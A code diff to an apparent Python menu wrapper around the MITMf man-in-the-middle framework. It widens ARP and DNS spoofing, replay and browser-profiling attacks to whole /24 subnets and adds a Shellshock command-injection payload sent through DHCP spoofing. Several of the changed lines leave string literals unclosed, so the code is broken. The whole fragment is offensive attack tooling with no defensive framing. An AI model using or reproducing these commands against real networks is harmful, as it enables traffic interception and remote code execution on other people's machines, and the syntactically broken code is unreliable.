@@ -73,16 +73,16 @@ while True:
 	menuOption=GetMenuSelection()
 	os.system("clear")
 	if menuOption=="1":
-    	os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip)
+    	os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip+"/24)
     	break
 	elif menuOption=="2":
-    	os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+" --mode rep")
+    	os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+"/24 --mode rep")
     	break
 	elif menuOption=="3":
-    	os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+" --browserprofiler")
+    	os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+"/24 --browserprofiler")
     	break
 	elif menuOption=="4":
-    	os.system("mitmf -i "+interface+" --spoof --dhcp --shellshock")
+    	os.system("mitmf -i "+interface+" --spoof --dhcp --shellshock \'echo Pwn3d\'")
     	break
 	elif menuOption=="5":
     	os.system("mitmf -i "+interface+" --spoof --icmp --gateway "+gateway+" --target "+ip)
